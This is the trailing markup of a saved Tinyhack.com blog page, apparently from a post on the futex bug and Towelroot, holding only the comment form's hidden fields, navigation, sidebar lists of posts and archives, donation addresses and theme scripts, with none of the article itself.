</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="2ae0482451"></p><p style="display:none;"><input type="text" name="nxts" value="1638465745"><input type="text" name="nxts_signed" value="bde0ef6c3646abf3abd440d7ec2caf6c39a42040"><input type="text" name="c29effba3fd5ae3" value=""><input type="text" name="7b27a3e270e59679e98bac25f8e" value="ea475611e74ce605949b8a40a9052"></p><textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100" style="display: none !important;"></textarea><input type="hidden" id="ak_js" name="ak_js" value="1638465748534"></form> </div>
</div>
<nav class="navigation post-navigation" role="navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://tinyhack.com/2014/03/12/implementing-a-web-server-in-a-single-printf-call/" rel="prev"><span class="meta-nav" aria-hidden="true">Previous</span> <span class="screen-reader-text">Previous post:</span> <span class="post-title">Implementing a web server in a single printf() call</span></a></div><div class="nav-next"><a href="https://tinyhack.com/2015/11/08/teensy-lc-u2f-key/" rel="next"><span class="meta-nav" aria-hidden="true">Next</span> <span class="screen-reader-text">Next post:</span> <span class="post-title">Teensy LC U2F key</span></a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="sidebar widget-area" role="complementary">
<section id="pages-2" class="widget widget_pages"><h2 class="widget-title">Pages</h2><nav role="navigation" aria-label="Pages">
<ul>
<li class="page_item page-item-5"><a href="https://tinyhack.com/about/">About</a></li>
<li class="page_item page-item-15"><a href="https://tinyhack.com/archive/">Archive</a></li>
</ul>
</nav></section><section id="search-2" class="widget widget_search">
<form role="search" method="get" class="search-form" action="https://tinyhack.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search …" value="" name="s">
</label>
<button type="submit" class="search-submit"><span class="screen-reader-text">Search</span></button>
</form>
</section><section id="text-2" class="widget widget_text"><h2 class="widget-title">Donate</h2> <div class="textwidget">
<ul>
<li><a href="https://paypal.me/yohanesnugroho">Paypal</a>
</li><li>Bitcoin (<a href="https://www.blockchain.com/btc/address/19mkof1of9yC5TNWbPw5gjGrcL2NHiHim9">19mkof1of9yC5TNWbPw5gjGrcL2NHiHim9</a>)</li>
<li>Ethereum or other tokens (<a href="https://etherscan.io/address/0x618b59AF01DC11b7fBb00f700E9b78A5cc2e234e">0x618b59AF01DC11b7fBb00f700E9b78A5cc2e234e</a>) </li>
<ul></ul></ul></div>
</section><section id="text-3" class="widget widget_text"><h2 class="widget-title">adsense</h2> <div class="textwidget"><script type="text/javascript"><!--
google_ad_client = "ca-pub-2563024894235569";
/* tinyhacksidebar */
google_ad_slot = "6302182665";
google_ad_width = 120;
google_ad_height = 240;
//-->
</script>
<script type="text/javascript" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/f.txt">
</script></div>
</section>
<section id="recent-posts-2" class="widget widget_recent_entries">
<h2 class="widget-title">Recent Posts</h2><nav role="navigation" aria-label="Recent Posts">
<ul>
<li>
<a href="https://tinyhack.com/2021/03/07/reversing-a-flutter-app-by-recompiling-flutter-engine/">Reverse Engineering a Flutter app by recompiling Flutter Engine</a>
</li>
<li>
<a href="https://tinyhack.com/2021/01/31/dissecting-a-mediatek-bootrom-exploit/">Dissecting a MediaTek BootROM exploit</a>
</li>
<li>
<a href="https://tinyhack.com/2019/05/01/reverse-engineering-pokemon-go-plus-part-2-ota-signature-bypass/">Reverse Engineering Pokémon GO Plus Part 2: OTA Signature Bypass</a>
</li>
<li>
<a href="https://tinyhack.com/2019/01/10/alternative-way-to-exploit-cve-2017-15944-on-pan-os-6-1-0/">An alternative way to exploit CVE-2017-15944 on PAN OS 6.1.0</a>
</li>
<li>
<a href="https://tinyhack.com/2018/11/21/reverse-engineering-pokemon-go-plus/">Reverse Engineering Pokémon GO Plus</a>
</li>
</ul>
</nav></section><section id="recent-comments-2" class="widget widget_recent_comments"><h2 class="widget-title">Recent Comments</h2><nav role="navigation" aria-label="Recent Comments"><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">Joh Doe</span> on <a href="https://tinyhack.com/2021/01/31/dissecting-a-mediatek-bootrom-exploit/#comment-109732">Dissecting a MediaTek BootROM exploit</a></li><li class="recentcomments"><span class="comment-author-link"><a href="https://www.ptrace-security.com/blog/it-security-news-bulletin-63/" rel="external nofollow ugc" class="url">IT Security News Bulletin #63 | Ptrace Security GmbH</a></span> on <a href="https://tinyhack.com/2021/03/07/reversing-a-flutter-app-by-recompiling-flutter-engine/#comment-109505">Reverse Engineering a Flutter app by recompiling Flutter Engine</a></li><li class="recentcomments"><span class="comment-author-link">admin</span> on <a href="https://tinyhack.com/2021/01/31/dissecting-a-mediatek-bootrom-exploit/#comment-109291">Dissecting a MediaTek BootROM exploit</a></li><li class="recentcomments"><span class="comment-author-link">MediaWreck</span> on <a href="https://tinyhack.com/2021/01/31/dissecting-a-mediatek-bootrom-exploit/#comment-109189">Dissecting a MediaTek BootROM exploit</a></li><li class="recentcomments"><span class="comment-author-link">admin</span> on <a href="https://tinyhack.com/2021/01/31/dissecting-a-mediatek-bootrom-exploit/#comment-108964">Dissecting a MediaTek BootROM exploit</a></li></ul></nav></section><section id="archives-2" class="widget widget_archive"><h2 class="widget-title">Archives</h2><nav role="navigation" aria-label="Archives">
<ul>
<li><a href="https://tinyhack.com/2021/03/">March 2021</a></li>
<li><a href="https://tinyhack.com/2021/01/">January 2021</a></li>
<li><a href="https://tinyhack.com/2019/05/">May 2019</a></li>
<li><a href="https://tinyhack.com/2019/01/">January 2019</a></li>
<li><a href="https://tinyhack.com/2018/11/">November 2018</a></li>
<li><a href="https://tinyhack.com/2018/07/">July 2018</a></li>
<li><a href="https://tinyhack.com/2018/05/">May 2018</a></li>
<li><a href="https://tinyhack.com/2018/02/">February 2018</a></li>
<li><a href="https://tinyhack.com/2017/10/">October 2017</a></li>
<li><a href="https://tinyhack.com/2017/09/">September 2017</a></li>
<li><a href="https://tinyhack.com/2017/03/">March 2017</a></li>
<li><a href="https://tinyhack.com/2016/11/">November 2016</a></li>
<li><a href="https://tinyhack.com/2015/11/">November 2015</a></li>
<li><a href="https://tinyhack.com/2014/07/">July 2014</a></li>
<li><a href="https://tinyhack.com/2014/03/">March 2014</a></li>
<li><a href="https://tinyhack.com/2014/02/">February 2014</a></li>
<li><a href="https://tinyhack.com/2013/06/">June 2013</a></li>
<li><a href="https://tinyhack.com/2013/01/">January 2013</a></li>
<li><a href="https://tinyhack.com/2011/11/">November 2011</a></li>
<li><a href="https://tinyhack.com/2011/03/">March 2011</a></li>
<li><a href="https://tinyhack.com/2011/02/">February 2011</a></li>
<li><a href="https://tinyhack.com/2010/07/">July 2010</a></li>
<li><a href="https://tinyhack.com/2010/04/">April 2010</a></li>
<li><a href="https://tinyhack.com/2010/01/">January 2010</a></li>
<li><a href="https://tinyhack.com/2009/12/">December 2009</a></li>
<li><a href="https://tinyhack.com/2009/09/">September 2009</a></li>
<li><a href="https://tinyhack.com/2009/08/">August 2009</a></li>
<li><a href="https://tinyhack.com/2009/06/">June 2009</a></li>
<li><a href="https://tinyhack.com/2009/05/">May 2009</a></li>
<li><a href="https://tinyhack.com/2009/04/">April 2009</a></li>
<li><a href="https://tinyhack.com/2009/03/">March 2009</a></li>
<li><a href="https://tinyhack.com/2009/02/">February 2009</a></li>
<li><a href="https://tinyhack.com/2009/01/">January 2009</a></li>
<li><a href="https://tinyhack.com/2008/12/">December 2008</a></li>
<li><a href="https://tinyhack.com/2008/10/">October 2008</a></li>
<li><a href="https://tinyhack.com/2008/09/">September 2008</a></li>
<li><a href="https://tinyhack.com/2008/08/">August 2008</a></li>
<li><a href="https://tinyhack.com/2008/07/">July 2008</a></li>
<li><a href="https://tinyhack.com/2008/06/">June 2008</a></li>
<li><a href="https://tinyhack.com/2008/05/">May 2008</a></li>
<li><a href="https://tinyhack.com/2008/03/">March 2008</a></li>
<li><a href="https://tinyhack.com/2008/02/">February 2008</a></li>
<li><a href="https://tinyhack.com/2007/10/">October 2007</a></li>
<li><a href="https://tinyhack.com/2007/06/">June 2007</a></li>
<li><a href="https://tinyhack.com/2007/02/">February 2007</a></li>
<li><a href="https://tinyhack.com/2007/01/">January 2007</a></li>
<li><a href="https://tinyhack.com/2006/12/">December 2006</a></li>
</ul>
</nav></section><section id="categories-2" class="widget widget_categories"><h2 class="widget-title">Categories</h2><nav role="navigation" aria-label="Categories">
<ul>
<li class="cat-item cat-item-3"><a href="https://tinyhack.com/category/agestar/">agestar</a>
</li>
<li class="cat-item cat-item-4"><a href="https://tinyhack.com/category/blog/">blog</a>
</li>
<li class="cat-item cat-item-20"><a href="https://tinyhack.com/category/ctf/">ctf</a>
</li>
<li class="cat-item cat-item-5"><a href="https://tinyhack.com/category/debian/">debian</a>
</li>
<li class="cat-item cat-item-22"><a href="https://tinyhack.com/category/flareon/">flareon</a>
</li>
<li class="cat-item cat-item-6"><a href="https://tinyhack.com/category/flex/">flex</a>
</li>
<li class="cat-item cat-item-7"><a href="https://tinyhack.com/category/freebsd/">freebsd</a>
</li>
<li class="cat-item cat-item-8"><a href="https://tinyhack.com/category/google/">google</a>
</li>
<li class="cat-item cat-item-9"><a href="https://tinyhack.com/category/hacks/">hacks</a>
</li>
<li class="cat-item cat-item-23"><a href="https://tinyhack.com/category/hardware/">hardware</a>
</li>
<li class="cat-item cat-item-10"><a href="https://tinyhack.com/category/hostmonster/">hostmonster</a>
</li>
<li class="cat-item cat-item-11"><a href="https://tinyhack.com/category/linux/">linux</a>
</li>
<li class="cat-item cat-item-12"><a href="https://tinyhack.com/category/mac-os-x/">mac os x</a>
</li>
<li class="cat-item cat-item-13"><a href="https://tinyhack.com/category/misc/">misc</a>
</li>
<li class="cat-item cat-item-14"><a href="https://tinyhack.com/category/mobile/">mobile</a>
</li>
<li class="cat-item cat-item-15"><a href="https://tinyhack.com/category/opensource/">opensource</a>
</li>
<li class="cat-item cat-item-16"><a href="https://tinyhack.com/category/phone/">phone</a>
</li>
<li class="cat-item cat-item-19"><a href="https://tinyhack.com/category/raspberry/">raspberry</a>
</li>
<li class="cat-item cat-item-26"><a href="https://tinyhack.com/category/reverse-engineering/">reverse-engineering</a>
</li>
<li class="cat-item cat-item-24"><a href="https://tinyhack.com/category/sdr/">sdr</a>
</li>
<li class="cat-item cat-item-17"><a href="https://tinyhack.com/category/security/">security</a>
</li>
<li class="cat-item cat-item-1"><a href="https://tinyhack.com/category/uncategorized/">Uncategorized</a>
</li>
<li class="cat-item cat-item-18"><a href="https://tinyhack.com/category/wii/">wii</a>
</li>
<li class="cat-item cat-item-21"><a href="https://tinyhack.com/category/writeup/">writeup</a>
</li>
</ul>
</nav></section><section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Meta</h2><nav role="navigation" aria-label="Meta">
<ul>
<li><a href="https://tinyhack.com/wp-login.php">Log in</a></li>
<li><a href="https://tinyhack.com/feed/">Entries feed</a></li>
<li><a href="https://tinyhack.com/comments/feed/">Comments feed</a></li>
<li><a href="https://wordpress.org/">WordPress.org</a></li>
</ul>
</nav></section> </aside>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="site-info">
<span class="site-title"><a href="https://tinyhack.com/" rel="home">Tinyhack.com</a></span>
<a href="https://wordpress.org/" class="imprint">
Proudly powered by WordPress </a>
</div>
</footer>
</div>
</div>
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/skip-link-focus-fix.js.下載" id="twentysixteen-skip-link-focus-fix-js" type="text/javascript"></script>
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/comment-reply.min.js.下載" id="comment-reply-js" type="text/javascript"></script>
<script id="twentysixteen-script-js-extra" type="text/javascript">
var screenReaderText = {"expand":"expand child menu","collapse":"collapse child menu"};
</script>
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/functions.js.下載" id="twentysixteen-script-js" type="text/javascript"></script>
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/wp-embed.min.js.下載" id="wp-embed-js" type="text/javascript"></script>
<script async="async" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/form.js.下載" id="akismet-form-js" type="text/javascript"></script>


</body></html>